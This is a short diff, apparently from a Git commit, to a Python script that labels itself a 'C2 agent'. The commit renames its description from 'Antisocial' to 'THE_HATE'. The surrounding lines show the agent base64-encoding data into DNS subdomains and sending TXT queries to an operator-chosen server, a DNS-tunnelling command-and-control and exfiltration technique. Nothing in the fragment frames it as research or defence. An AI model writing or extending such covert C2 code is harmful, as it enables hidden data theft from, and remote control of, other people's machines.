@@ -65,7 +65,7 @@ def main(s, server, port):
                 r = DNSRecord.question(f"{b64encode(img_url.encode()).decode()}.hello.com", qtype="TXT")
                 s.sendto(r.pack(), (server, port))
 
-parser = argparse.ArgumentParser(description="Antisocial C2 agent")
+parser = argparse.ArgumentParser(description="THE_HATE C2 agent")
 parser.add_argument("--server", required=True, help="DNS server IP")
 parser.add_argument("--port", type=int, default=53, help="DNS server port")
 args = parser.parse_args()
